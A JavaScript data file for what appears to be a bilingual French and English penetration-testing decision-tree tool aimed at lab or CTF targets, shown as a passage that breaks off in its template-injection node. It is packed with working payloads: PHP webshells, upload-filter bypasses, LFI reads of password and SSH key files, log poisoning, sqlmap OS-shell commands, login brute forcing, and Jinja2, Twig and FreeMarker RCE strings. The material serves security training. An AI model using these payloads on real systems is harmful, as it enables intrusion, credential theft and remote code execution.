const NODES = {

  "start": {
    id: "start", title: "Reconnaissance Initiale", title_en: "Initial Reconnaissance", category: "recon", icon: "🎯",
    description: "Point d'entrée universel. Cartographier la surface d'attaque avant tout.",
    description_en: "Universal entry point. Map the attack surface before anything else.",
    commands: [
      { label: "Scan complet tous ports", label_en: "Full scan all ports", cmd: "nmap -sV -sC -p- --min-rate 5000 -oA nmap_full TARGET_IP" },
      { label: "Scan rapide 1000 ports", label_en: "Quick scan top 1000 ports", cmd: "nmap -sV -sC --top-ports 1000 -oN nmap_quick.txt TARGET_IP" },
      { label: "Scan UDP courants", label_en: "Common UDP scan", cmd: "sudo nmap -sU --top-ports 20 TARGET_IP" },
      { label: "Si ICMP bloqué", label_en: "If ICMP is blocked", cmd: "nmap -Pn -sV -sC -p- TARGET_IP" },
      { label: "Ping sweep réseau", label_en: "Network ping sweep", cmd: "nmap -sn 10.10.10.0/24" }
    ],
    lookfor: [
      "Ports ouverts et services associés",
      "Versions des services → chercher CVEs sur searchsploit/exploitdb",
      "OS détecté (Windows/Linux)",
      "Scripts NSE : résultats de --script=default révèlent souvent des infos"
    ],
    lookfor_en: [
      "Open ports and associated services",
      "Service versions → look for CVEs on searchsploit/exploitdb",
      "Detected OS (Windows/Linux)",
      "NSE scripts: --script=default results often reveal useful info"
    ],
    tips: [
      "Toujours -oA pour sauvegarder. Tu reliras les résultats 10 fois.",
      "--min-rate 5000 peut rater des ports sur boxes lentes → retry à --min-rate 1000",
      "Note TOUS les ports même ceux qui semblent inutiles",
      "Port inhabituel ? Cherche-le sur shodan.io pour identifier le service"
    ],
    tips_en: [
      "Always use -oA to save output. You'll re-read results 10 times.",
      "--min-rate 5000 may miss ports on slow boxes → retry with --min-rate 1000",
      "Note ALL ports even those that seem useless",
      "Unusual port? Look it up on shodan.io to identify the service"
    ],
    choices: [
      { label: "Port 80 / 443 ouvert (HTTP/HTTPS)", label_en: "Port 80 / 443 open (HTTP/HTTPS)", next: "web_initial", icon: "🌐" },
      { label: "Port 22 ouvert (SSH)", label_en: "Port 22 open (SSH)", next: "ssh_enum", icon: "🔐" },
      { label: "Port 21 ouvert (FTP)", label_en: "Port 21 open (FTP)", next: "ftp_enum", icon: "📂" },
      { label: "Port 445/139 ouvert (SMB / Windows)", label_en: "Port 445/139 open (SMB / Windows)", next: "smb_enum", icon: "🪟" },
      { label: "Port 3306 ouvert (MySQL)", label_en: "Port 3306 open (MySQL)", next: "mysql_enum", icon: "🗄️" },
      { label: "Port 3389 ouvert (RDP)", label_en: "Port 3389 open (RDP)", next: "rdp_enum", icon: "🖥️" },
      { label: "Port 6379 ouvert (Redis)", label_en: "Port 6379 open (Redis)", next: "redis_enum", icon: "🔴" },
      { label: "Port 27017 ouvert (MongoDB)", label_en: "Port 27017 open (MongoDB)", next: "mongodb_enum", icon: "🍃" },
      { label: "Ports multiples / service inconnu", label_en: "Multiple ports / unknown service", next: "multi_service", icon: "🔍" },
      { label: "Aucun port ouvert visible", label_en: "No visible open port", next: "no_open_ports", icon: "🚫" }
    ]
  },

  // ─── WEB ──────────────────────────────────────────────────────────────────

  "web_initial": {
    id: "web_initial", title: "Énumération Web Initiale", title_en: "Initial Web Enumeration", category: "web", icon: "🌐",
    description: "Identifier la technologie, les répertoires cachés et les points d'entrée potentiels.",
    description_en: "Identify the technology stack, hidden directories and potential entry points.",
    commands: [
      { label: "Détection technologie", label_en: "Technology detection", cmd: "whatweb http://TARGET_IP\nwappalyzer (extension navigateur)" },
      { label: "Scan de répertoires (feroxbuster — recommandé)", label_en: "Directory scan (feroxbuster — recommended)", cmd: "# Scan complet — tous les codes HTTP\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o ferox.txt\n\n# Version filtrée — ne garder que 200, 301, 302, 401, 403\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -C 404,500 \\\n  -o ferox.txt" },
      { label: "Gobuster alternative", label_en: "Gobuster alternative", cmd: "# Scan complet\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -o gobuster.txt\n\n# Version filtrée — ignorer 404 et 500\ngobuster dir -u http://TARGET_IP \\\n  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak \\\n  -b 404,500 \\\n  -o gobuster.txt" },
      { label: "Nikto — scan vulnérabilités web", label_en: "Nikto — web vulnerability scan", cmd: "nikto -h http://TARGET_IP -o nikto.txt" },
      { label: "Fuzzing de vhosts/subdomains", label_en: "Vhost/subdomain fuzzing", cmd: "# Étape 1 — noter la taille de la réponse par défaut (sans filtre)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN'\n\n# Étape 2 — filtrer par la taille par défaut (remplacer WRONG_SIZE)\nffuf -w /usr/share/metasploit-framework/data/wordlists/namelist.txt \\\n  -u http://TARGET_IP \\\n  -H 'Host: FUZZ.TARGET_DOMAIN' \\\n  -fs WRONG_SIZE \\\n  -fc 404,500" },
      { label: "Robots.txt et sitemap", label_en: "Robots.txt and sitemap", cmd: "curl http://TARGET_IP/robots.txt\ncurl http://TARGET_IP/sitemap.xml" }
    ],
    lookfor: [
      "Framework/CMS détecté (WordPress, Drupal, Joomla, Laravel…)",
      "Répertoires intéressants : /admin, /backup, /upload, /api, /.git",
      "Fichiers sensibles : config.php, .env, backup.zip, id_rsa",
      "Version du CMS ou du framework → chercher CVEs",
      "Formulaires de login ou d'upload",
      "Paramètres GET/POST suspects"
    ],
    lookfor_en: [
      "Detected framework/CMS (WordPress, Drupal, Joomla, Laravel…)",
      "Interesting directories: /admin, /backup, /upload, /api, /.git",
      "Sensitive files: config.php, .env, backup.zip, id_rsa",
      "CMS or framework version → look for CVEs",
      "Login or upload forms",
      "Suspicious GET/POST parameters"
    ],
    tips: [
      "Inspecter le code source (Ctrl+U) : commentaires HTML, chemins cachés, credentials",
      "Regarder les cookies : flags HttpOnly/Secure absents, JWT tokens",
      "Intercepter avec Burp Suite pour voir toutes les requêtes",
      "Chercher /.git/HEAD — si accessible, dumper le repo avec git-dumper"
    ],
    tips_en: [
      "Inspect page source (Ctrl+U): HTML comments, hidden paths, credentials",
      "Check cookies: missing HttpOnly/Secure flags, JWT tokens",
      "Intercept with Burp Suite to see all requests",
      "Look for /.git/HEAD — if accessible, dump the repo with git-dumper"
    ],
    choices: [
      { label: "CMS détecté (WordPress, Drupal, Joomla)", label_en: "CMS detected (WordPress, Drupal, Joomla)", next: "web_cms", icon: "📝" },
      { label: "Formulaire de login trouvé", label_en: "Login form found", next: "web_login", icon: "🔑" },
      { label: "Formulaire d'upload de fichier", label_en: "File upload form", next: "web_upload", icon: "📤" },
      { label: "Paramètre GET/POST potentiellement vulnérable (id=, file=, page=…)", label_en: "Potentially vulnerable GET/POST parameter (id=, file=, page=…)", next: "web_param_vuln", icon: "🎯" },
      { label: "Répertoire /api ou endpoints API trouvés", label_en: "/api directory or API endpoints found", next: "web_api", icon: "⚡" },
      { label: "Répertoire /.git accessible", label_en: "/.git directory accessible", next: "web_git_exposed", icon: "🐙" },
      { label: "Fichiers sensibles trouvés (.env, config, backup)", label_en: "Sensitive files found (.env, config, backup)", next: "web_sensitive_files", icon: "📁" },
      { label: "Rien d'évident — continuer l'énumération", label_en: "Nothing obvious — continue enumeration", next: "web_deep_enum", icon: "🔍" }
    ]
  },

  "web_cms": {
    id: "web_cms", title: "CMS Détecté", title_en: "CMS Detected", category: "web", icon: "📝",
    description: "Les CMS ont des vulnérabilités connues et des chemins prévisibles. Identifier la version est crucial.",
    description_en: "CMSes have known vulnerabilities and predictable paths. Identifying the version is critical.",
    commands: [
      { label: "WordPress — scan complet", label_en: "WordPress — full scan", cmd: "wpscan --url http://TARGET_IP --enumerate u,p,t,vp --api-token YOUR_TOKEN -o wpscan.txt" },
      { label: "WordPress — sans token", label_en: "WordPress — without token", cmd: "wpscan --url http://TARGET_IP --enumerate u,p,t" },
      { label: "Drupal — droopescan", label_en: "Drupal — droopescan", cmd: "droopescan scan drupal -u http://TARGET_IP" },
      { label: "Joomla — joomscan", label_en: "Joomla — joomscan", cmd: "joomscan -u http://TARGET_IP" },
      { label: "Chercher CVEs", label_en: "Look for CVEs", cmd: "searchsploit wordpress 5.8\nsearchsploit drupal 8\nsearchsploit joomla 3.9" }
    ],
    lookfor: [
      "Version exacte du CMS",
      "Plugins/thèmes vulnérables (WordPress)",
      "Comptes utilisateurs énumérés",
      "Chemins d'administration : /wp-admin, /administrator, /user/login"
    ],
    lookfor_en: [
      "Exact CMS version",
      "Vulnerable plugins/themes (WordPress)",
      "Enumerated user accounts",
      "Admin paths: /wp-admin, /administrator, /user/login"
    ],
    tips: [
      "WordPress : /wp-json/wp/v2/users révèle souvent les usernames",
      "Drupal < 8.5.11 → Drupalgeddon2 (CVE-2018-7600) → RCE sans auth",
      "Joomla : chercher /administrator pour le login admin"
    ],
    tips_en: [
      "WordPress: /wp-json/wp/v2/users often reveals usernames",
      "Drupal < 8.5.11 → Drupalgeddon2 (CVE-2018-7600) → unauthenticated RCE",
      "Joomla: look for /administrator for the admin login"
    ],
    choices: [
      { label: "Version vulnérable trouvée (CVE connue)", label_en: "Vulnerable version found (known CVE)", next: "exploit_searchsploit", icon: "💥" },
      { label: "Login admin accessible — tenter les credentials", label_en: "Admin login accessible — try credentials", next: "web_login", icon: "🔑" },
      { label: "Plugin WordPress vulnérable identifié", label_en: "Vulnerable WordPress plugin identified", next: "wp_plugin_rce", icon: "🔌" },
      { label: "Utilisateurs énumérés → brute force", label_en: "Users enumerated → brute force", next: "web_brute_login", icon: "🔨" }
    ]
  },

  "wp_plugin_rce": {
    id: "wp_plugin_rce", title: "Plugin WordPress Vulnérable", title_en: "Vulnerable WordPress Plugin", category: "web", icon: "🔌",
    description: "De nombreux plugins WordPress ont des CVEs permettant RCE, LFI ou SQLi.",
    description_en: "Many WordPress plugins have CVEs enabling RCE, LFI or SQLi.",
    commands: [
      { label: "Lister plugins actifs", label_en: "List active plugins", cmd: "wpscan --url http://TARGET_IP --enumerate p --plugins-detection aggressive" },
      { label: "Chercher exploit pour le plugin", label_en: "Search exploit for the plugin", cmd: "searchsploit wordpress plugin NOM_PLUGIN\nexploit-db.com → recherche manuelle" },
      { label: "Télécharger et adapter l'exploit", label_en: "Download and adapt the exploit", cmd: "searchsploit -m EXPLOIT_ID\npython3 exploit.py http://TARGET_IP" }
    ],
    lookfor: ["Nom et version du plugin", "Type de vulnérabilité : RCE, LFI, SQLi, CSRF, Upload"],
    lookfor_en: ["Plugin name and version", "Vulnerability type: RCE, LFI, SQLi, CSRF, Upload"],
    tips: ["wpscan avec --api-token gratuit (500 req/jour) donne les CVEs directement", "Chercher aussi sur packetstormsecurity.com et github"],
    tips_en: ["wpscan with free --api-token (500 req/day) gives CVEs directly", "Also search on packetstormsecurity.com and GitHub"],
    choices: [
      { label: "RCE obtenu", label_en: "RCE obtained", next: "rce_found", icon: "💥" },
      { label: "LFI trouvé via le plugin", label_en: "LFI found via the plugin", next: "web_lfi_found", icon: "📂" },
      { label: "SQLi trouvé via le plugin", label_en: "SQLi found via the plugin", next: "web_sqli_found", icon: "🗄️" }
    ]
  },

  "web_login": {
    id: "web_login", title: "Formulaire de Login", title_en: "Login Form", category: "web", icon: "🔑",
    description: "Tester les credentials par défaut, l'injection SQL et le brute force.",
    description_en: "Test default credentials, SQL injection and brute force.",
    commands: [
      { label: "Credentials par défaut à tester", label_en: "Default credentials to try", cmd: "admin:admin | admin:password | admin:123456\nadmin:admin123 | root:root | test:test\nguest:guest | administrator:administrator" },
      { label: "Test SQLi basique dans login", label_en: "Basic SQLi test in login", cmd: "Username: admin'--\nUsername: ' OR 1=1--\nUsername: ' OR '1'='1'--\nPassword: anything" },
      { label: "Hydra brute force HTTP POST", label_en: "Hydra brute force HTTP POST", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'" },
      { label: "Hydra HTTP GET form", label_en: "Hydra HTTP GET form", cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt TARGET_IP http-get-form '/login:user=^USER^&pass=^PASS^:Wrong'" }
    ],
    lookfor: [
      "Message d'erreur différent entre mauvais user et mauvais password → username enumeration",
      "Redirection après login → succès",
      "Cookie de session créé → tester manipulation"
    ],
    lookfor_en: [
      "Different error message between wrong user and wrong password → username enumeration",
      "Redirect after login → success",
      "Session cookie created → test manipulation"
    ],
    tips: [
      "Message d'erreur différent = username enumeration possible → phase 1 hydra avec liste d'users",
      "Tester SQLi dans TOUS les champs, pas seulement username",
      "Burp Suite Intruder pour brute force avec plus de contrôle"
    ],
    tips_en: [
      "Different error message = username enumeration possible → phase 1 hydra with user list",
      "Test SQLi in ALL fields, not just username",
      "Burp Suite Intruder for brute force with more control"
    ],
    choices: [
      { label: "Login réussi avec credentials par défaut", label_en: "Login successful with default credentials", next: "web_authenticated", icon: "✅" },
      { label: "SQLi fonctionne — accès admin obtenu", label_en: "SQLi works — admin access obtained", next: "web_authenticated", icon: "💉" },
      { label: "SQLi détecté mais pas encore exploité", label_en: "SQLi detected but not yet exploited", next: "web_sqli_found", icon: "🗄️" },
      { label: "Brute force → credentials trouvés", label_en: "Brute force → credentials found", next: "web_authenticated", icon: "🔨" },
      { label: "Accès admin → chercher upload ou RCE", label_en: "Admin access → look for upload or RCE", next: "web_authenticated", icon: "⚙️" }
    ]
  },

  "web_brute_login": {
    id: "web_brute_login", title: "Brute Force Login", title_en: "Brute Force Login", category: "web", icon: "🔨",
    description: "Attaque par dictionnaire sur un formulaire d'authentification.",
    description_en: "Dictionary attack against an authentication form.",
    commands: [
      { label: "Hydra POST form", label_en: "Hydra POST form", cmd: "hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form '/login.php:user=^USER^&pass=^PASS^:Mot de passe incorrect'" },
      { label: "Hydra SSH", label_en: "Hydra SSH", cmd: "hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP" },
      { label: "Medusa alternative", label_en: "Medusa alternative", cmd: "medusa -h TARGET_IP -u USERNAME -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login.php -m FORM:user=^USER^&pass=^PASS^" },
      { label: "Wfuzz brute force", label_en: "Wfuzz brute force", cmd: "wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d 'username=admin&password=FUZZ' http://TARGET_IP/login.php" }
    ],
    lookfor: ["Réponse HTTP différente (taille, code, message)", "Absence du message d'erreur habituel"],
    lookfor_en: ["Different HTTP response (size, status code, message)", "Absence of the usual error message"],
    tips: [
      "Identifier exactement le message d'échec pour hydra (copier-coller depuis la réponse)",
      "Tester d'abord avec un mot de passe connu faux pour valider la syntaxe hydra",
      "Rate limiting ? Ajouter des délais : hydra -t 4 -W 3"
    ],
    tips_en: [
      "Identify the exact failure message for hydra (copy-paste from the response)",
      "Test first with a known wrong password to validate hydra syntax",
      "Rate limiting? Add delays: hydra -t 4 -W 3"
    ],
    choices: [
      { label: "Credentials trouvés", label_en: "Credentials found", next: "web_authenticated", icon: "✅" },
      { label: "Rate limiting / IP ban", label_en: "Rate limiting / IP ban", next: "bypass_ratelimit", icon: "🚧" }
    ]
  },

  "web_authenticated": {
    id: "web_authenticated", title: "Accès Authentifié — Que faire ?", title_en: "Authenticated Access — What Now?", category: "web", icon: "✅",
    description: "Vous êtes connecté. Explorer les fonctionnalités et chercher des vecteurs d'escalade.",
    description_en: "You are logged in. Explore features and look for escalation vectors.",
    commands: [
      { label: "Spider l'app authentifiée avec Burp", label_en: "Spider the authenticated app with Burp", cmd: "Burp Suite > Proxy > Spider (crawl en étant loggé)" },
      { label: "Chercher upload de fichiers", label_en: "Look for file upload", cmd: "Naviguer dans toutes les sections — profil, settings, documents, media" },
      { label: "Tester privilege escalation horizontal/vertical", label_en: "Test horizontal/vertical privilege escalation", cmd: "Changer les IDs dans les URLs : /user/1/profile → /user/2/profile (IDOR)" }
    ],
    lookfor: [
      "Formulaire d'upload de fichier",
      "Fonctionnalité d'exécution de commandes (ex: ping tool, lookup)",
      "IDOR : manipulation d'IDs dans URLs/paramètres",
      "Section admin ou fonctionnalité réservée aux admins"
    ],
    lookfor_en: [
      "File upload form",
      "Command execution functionality (e.g. ping tool, lookup)",
      "IDOR: manipulation of IDs in URLs/parameters",
      "Admin section or admin-only functionality"
    ],
    tips: ["Être admin ≠ fin du jeu — chercher RCE depuis l'interface admin"],
    tips_en: ["Being admin ≠ end of game — look for RCE from the admin interface"],
    choices: [
      { label: "Upload de fichier disponible", label_en: "File upload available", next: "web_upload", icon: "📤" },
      { label: "Fonctionnalité qui exécute des commandes", label_en: "Functionality that executes commands", next: "web_cmd_injection", icon: "⚡" },
      { label: "IDOR détecté", label_en: "IDOR detected", next: "web_idor", icon: "🔄" },
      { label: "Panneau admin avec éditeur de template/fichiers", label_en: "Admin panel with template/file editor", next: "web_template_edit", icon: "✏️" }
    ]
  },

  "web_upload": {
    id: "web_upload", title: "Upload de Fichier", title_en: "File Upload", category: "web", icon: "📤",
    description: "Tenter d'uploader un webshell PHP. Contourner les filtres de type/extension.",
    description_en: "Attempt to upload a PHP webshell. Bypass type/extension filters.",
    commands: [
      { label: "Webshell PHP minimal", label_en: "Minimal PHP webshell", cmd: "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php" },
      { label: "Webshell PHP complet", label_en: "Full PHP webshell", cmd: "cp /usr/share/webshells/php/php-reverse-shell.php .\n# Modifier IP et PORT" },
      { label: "Bypass extension — essayer ces extensions", label_en: "Extension bypass — try these extensions", cmd: "shell.php\nshell.php5\nshell.php3\nshell.phtml\nshell.pHp\nshell.PHP\nshell.php.jpg\nshell.jpg.php" },
      { label: "Bypass MIME type avec Burp", label_en: "MIME type bypass with Burp", cmd: "Intercepter l'upload > changer Content-Type: image/jpeg\nmais garder le contenu PHP" },
      { label: "Polyglot JPG+PHP", label_en: "Polyglot JPG+PHP", cmd: "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg" }
    ],
    lookfor: [
      "Où est uploadé le fichier ? /uploads/, /media/, /files/ — feroxbuster pour trouver",
      "Le fichier est-il exécutable ? Accéder à http://TARGET/uploads/shell.php?cmd=id",
      "Message d'erreur révélateur du type de filtre"
    ],
    lookfor_en: [
      "Where is the file uploaded? /uploads/, /media/, /files/ — use feroxbuster to find it",
      "Is the file executable? Access http://TARGET/uploads/shell.php?cmd=id",
      "Error message revealing the filter type"
    ],
    tips: [
      "Si seul le MIME type est vérifié → Burp Proxy pour modifier Content-Type",
      "Si le chemin est inconnu → faire un gobuster ciblé sur les répertoires d'upload",
      "Double extension : shell.jpg.php → le serveur peut exécuter le dernier .php"
    ],
    tips_en: [
      "If only MIME type is checked → Burp Proxy to modify Content-Type",
      "If the path is unknown → run a targeted gobuster on upload directories",
      "Double extension: shell.jpg.php → the server may execute the last .php"
    ],
    choices: [
      { label: "Shell uploadé et exécutable — RCE obtenu", label_en: "Shell uploaded and executable — RCE obtained", next: "rce_found", icon: "💥" },
      { label: "Upload bloqué — tester d'autres contournements", label_en: "Upload blocked — try other bypasses", next: "web_upload_bypass", icon: "🔄" }
    ]
  },

  "web_upload_bypass": {
    id: "web_upload_bypass", title: "Bypass de Restrictions Upload", title_en: "Upload Restriction Bypass", category: "web", icon: "🔄",
    description: "Contournements avancés quand les filtres basiques ne suffisent pas.",
    description_en: "Advanced bypass techniques when basic filters are not enough.",
    commands: [
      { label: "Null byte (anciens serveurs)", label_en: "Null byte (legacy servers)", cmd: "Renommer : shell.php%00.jpg\n# Le serveur tronque après %00" },
      { label: "Magic bytes — ajouter header GIF", label_en: "Magic bytes — add GIF header", cmd: "echo 'GIF89a' > shell.php.gif && echo '<?php system($_GET[\"cmd\"]); ?>' >> shell.php.gif" },
      { label: ".htaccess upload pour forcer exécution PHP", label_en: ".htaccess upload to force PHP execution", cmd: "echo 'AddType application/x-httpd-php .jpg' > .htaccess\n# Puis uploader shell.jpg" },
      { label: "Tester SVG avec script", label_en: "Test SVG with script tag", cmd: "echo '<svg><script>alert(1)</script></svg>' > xss.svg" },
      { label: "Zip slip attack", label_en: "Zip slip attack", cmd: "# Créer une archive avec path traversal\npython3 -c \"import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.write('shell.php','../../var/www/html/shell.php'); z.close()\"" }
    ],
    lookfor: ["Le serveur accepte-t-il .htaccess ?", "Erreur différente selon l'extension → filtrage par liste blanche vs noire"],
    lookfor_en: ["Does the server accept .htaccess?", "Different error depending on extension → blacklist vs whitelist filtering"],
    tips: ["Liste noire → ajouter .htaccess pour forcer l'exécution", "Liste blanche → polyglot ou format alternatif"],
    tips_en: ["Blacklist → upload .htaccess to force execution", "Whitelist → polyglot or alternative format"],
    choices: [
      { label: "Bypass trouvé — RCE obtenu", label_en: "Bypass found — RCE obtained", next: "rce_found", icon: "💥" },
      { label: "Aucun bypass ne fonctionne — chercher autre vecteur", label_en: "No bypass works — look for another vector", next: "web_initial", icon: "↩️" }
    ]
  },

  "web_param_vuln": {
    id: "web_param_vuln", title: "Paramètre Potentiellement Vulnérable", title_en: "Potentially Vulnerable Parameter", category: "web", icon: "🎯",
    description: "Un paramètre GET/POST accepte des données — tester injection SQL, LFI, SSTI, commande.",
    description_en: "A GET/POST parameter accepts user input — test for SQLi, LFI, SSTI, command injection.",
    commands: [
      { label: "Identifier le contexte du paramètre", label_en: "Identify the parameter context", cmd: "# Tester : ?page=../../../../etc/passwd (LFI)\n# Tester : ?id=1' (SQLi)\n# Tester : ?name={{7*7}} (SSTI)\n# Tester : ?host=127.0.0.1;id (CMDi)" },
      { label: "Test LFI rapide", label_en: "Quick LFI test", cmd: "curl 'http://TARGET_IP/index.php?page=../../../../etc/passwd'" },
      { label: "Test SQLi rapide", label_en: "Quick SQLi test", cmd: "sqlmap -u 'http://TARGET_IP/page.php?id=1' --dbs --batch" },
      { label: "Test SSTI", label_en: "SSTI test", cmd: "# Tester dans le paramètre :\n{{7*7}} → 49 = Jinja2/Twig\n${7*7} → 49 = FreeMarker\n<%= 7*7 %> → 49 = ERB (Ruby)" }
    ],
    lookfor: ["Réponse différente avec payload", "Erreur SQL ou stack trace", "Inclusion de fichier dans la réponse"],
    lookfor_en: ["Different response with payload", "SQL error or stack trace", "File inclusion in the response"],
    tips: ["Tester un paramètre à la fois", "Burp Repeater pour itérer rapidement"],
    tips_en: ["Test one parameter at a time", "Burp Repeater to iterate quickly"],
    choices: [
      { label: "LFI confirmé — lecture de fichiers locaux", label_en: "LFI confirmed — local file read", next: "web_lfi_found", icon: "📂" },
      { label: "SQLi confirmé", label_en: "SQLi confirmed", next: "web_sqli_found", icon: "💉" },
      { label: "SSTI confirmé ({{7*7}} = 49)", label_en: "SSTI confirmed ({{7*7}} = 49)", next: "web_ssti", icon: "🔧" },
      { label: "Command injection confirmé", label_en: "Command injection confirmed", next: "web_cmd_injection", icon: "⚡" }
    ]
  },

  "web_lfi_found": {
    id: "web_lfi_found", title: "LFI Confirmé", title_en: "LFI Confirmed", category: "web", icon: "📂",
    description: "Local File Inclusion : lire des fichiers sensibles, puis tenter d'escalader vers RCE.",
    description_en: "Local File Inclusion: read sensitive files, then attempt to escalate to RCE.",
    commands: [
      { label: "Lire /etc/passwd", label_en: "Read /etc/passwd", cmd: "curl 'http://TARGET_IP/page.php?file=../../../../etc/passwd'" },
      { label: "Lire clé SSH privée", label_en: "Read SSH private key", cmd: "curl 'http://TARGET_IP/page.php?file=../../../../home/USER/.ssh/id_rsa'" },
      { label: "Lire fichiers config web", label_en: "Read web config files", cmd: "curl 'http://TARGET_IP/page.php?file=../../../../var/www/html/config.php'\ncurl 'http://TARGET_IP/page.php?file=../../../../etc/apache2/sites-enabled/000-default.conf'" },
      { label: "Log Poisoning — empoisonner /var/log/apache2/access.log", label_en: "Log Poisoning — poison /var/log/apache2/access.log", cmd: "# Injecter PHP dans User-Agent\ncurl -A '<?php system($_GET[\"cmd\"]); ?>' http://TARGET_IP\n# Puis inclure le log\ncurl 'http://TARGET_IP/page.php?file=../../../../var/log/apache2/access.log&cmd=id'" },
      { label: "PHP Filter — lire code source en base64", label_en: "PHP Filter — read source code as base64", cmd: "curl 'http://TARGET_IP/page.php?file=php://filter/convert.base64-encode/resource=config.php'" },
      { label: "Wrapper PHP input (RCE direct)", label_en: "PHP input wrapper (direct RCE)", cmd: "curl -X POST 'http://TARGET_IP/page.php?file=php://input' --data '<?php system(\"id\"); ?>'" }
    ],
    lookfor: [
      "/etc/passwd : identifier les utilisateurs avec shell (/bin/bash)",
      "Fichiers de config avec mots de passe",
      "Logs accessibles pour log poisoning"
    ],
    lookfor_en: [
      "/etc/passwd: identify users with a shell (/bin/bash)",
      "Config files with passwords",
      "Accessible logs for log poisoning"
    ],
    tips: [
      "php://filter est souvent oublié par les devs — lire le code PHP source révèle d'autres failles",
      "Log poisoning : nginx log = /var/log/nginx/access.log",
      "Si filtre sur '../' → essayer ..././ ou ....// (double encoding)"
    ],
    tips_en: [
      "php://filter is often overlooked by devs — reading PHP source code reveals other flaws",
      "Log poisoning: nginx log = /var/log/nginx/access.log",
      "If '../' is filtered → try ..././ or ....// (double encoding)"
    ],
    choices: [
      { label: "Clé SSH privée trouvée", label_en: "SSH private key found", next: "ssh_key_stolen", icon: "🔑" },
      { label: "Credentials trouvés dans config", label_en: "Credentials found in config", next: "credentials_found", icon: "🏆" },
      { label: "Log poisoning → RCE obtenu", label_en: "Log poisoning → RCE obtained", next: "rce_found", icon: "💥" },
      { label: "PHP wrapper RCE fonctionne", label_en: "PHP wrapper RCE works", next: "rce_found", icon: "💥" }
    ]
  },

  "web_sqli_found": {
    id: "web_sqli_found", title: "SQL Injection Confirmée", title_en: "SQL Injection Confirmed", category: "web", icon: "💉",
    description: "Exploiter l'injection SQL pour extraire des données ou obtenir un accès.",
    description_en: "Exploit SQL injection to extract data or gain access.",
    commands: [
      { label: "SQLmap — énumération complète", label_en: "SQLmap — full enumeration", cmd: "sqlmap -u 'http://TARGET_IP/page.php?id=1' --dbs --batch -v 3" },
      { label: "SQLmap — tables d'une DB", label_en: "SQLmap — tables of a DB", cmd: "sqlmap -u 'http://TARGET_IP/page.php?id=1' -D DATABASE_NAME --tables --batch" },
      { label: "SQLmap — dump d'une table", label_en: "SQLmap — dump a table", cmd: "sqlmap -u 'http://TARGET_IP/page.php?id=1' -D DATABASE_NAME -T TABLE_NAME --dump --batch" },
      { label: "SQLmap — POST request", label_en: "SQLmap — POST request", cmd: "sqlmap -u 'http://TARGET_IP/login.php' --data 'user=admin&pass=test' -p user --dbs --batch" },
      { label: "SQLmap depuis fichier Burp", label_en: "SQLmap from Burp request file", cmd: "sqlmap -r request.txt --dbs --batch" },
      { label: "SQLmap — tenter webshell", label_en: "SQLmap — attempt webshell", cmd: "sqlmap -u 'http://TARGET_IP/page.php?id=1' --os-shell --batch" },
      { label: "Injection manuelle UNION", label_en: "Manual UNION injection", cmd: "?id=1 ORDER BY 3--\n?id=1 UNION SELECT 1,2,3--\n?id=1 UNION SELECT 1,user(),database()--" }
    ],
    lookfor: [
      "Table users/admins avec mots de passe (MD5, bcrypt, SHA1)",
      "Fichiers lisibles via LOAD_FILE()",
      "Écriture de fichiers avec INTO OUTFILE (webshell)"
    ],
    lookfor_en: [
      "users/admins table with passwords (MD5, bcrypt, SHA1)",
      "Files readable via LOAD_FILE()",
      "File write with INTO OUTFILE (webshell)"
    ],
    tips: [
      "--os-shell nécessite FILE privilege et connaissance du webroot",
      "Hashes trouvés → hashcat ou crackstation.net",
      "SQLmap avec --level 5 --risk 3 pour tests plus agressifs"
    ],
    tips_en: [
      "--os-shell requires FILE privilege and knowledge of the webroot",
      "Found hashes → hashcat or crackstation.net",
      "SQLmap with --level 5 --risk 3 for more aggressive testing"
    ],
    choices: [
      { label: "Credentials/hashes extraits", label_en: "Credentials/hashes extracted", next: "password_crack", icon: "🔓" },
      { label: "os-shell obtenu → RCE", label_en: "os-shell obtained → RCE", next: "rce_found", icon: "💥" },
      { label: "Login admin possible avec les creds trouvés", label_en: "Admin login possible with found creds", next: "web_login", icon: "🔑" }
    ]
  },

  "web_ssti": {
    id: "web_ssti", title: "SSTI — Server Side Template Injection", title_en: "SSTI — Server Side Template Injection", category: "web", icon: "🔧",
    description: "Injection dans un moteur de templates → RCE selon le moteur.",
    description_en: "Injection into a template engine → RCE depending on the engine.",
    commands: [
      { label: "Identifier le moteur", label_en: "Identify the engine", cmd: "{{7*7}} → 49 → Jinja2 (Python) ou Twig (PHP)\n${7*7} → 49 → Freemarker/Thymeleaf (Java)\n#{7*7} → 49 → Ruby ERB\n{{7*'7'}} → 7777777 → Jinja2 | 49 → Twig" },
      { label: "Jinja2 — RCE", label_en: "Jinja2 — RCE", cmd: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}" },
      { label: "Twig (PHP) — RCE", label_en: "Twig (PHP) — RCE", cmd: "{{['id']|filter('system')}}\n{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
      { label: "FreeMarker (Java) — RCE", label_en: "FreeMarker (Java) — RCE", cmd: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}" }
    ],
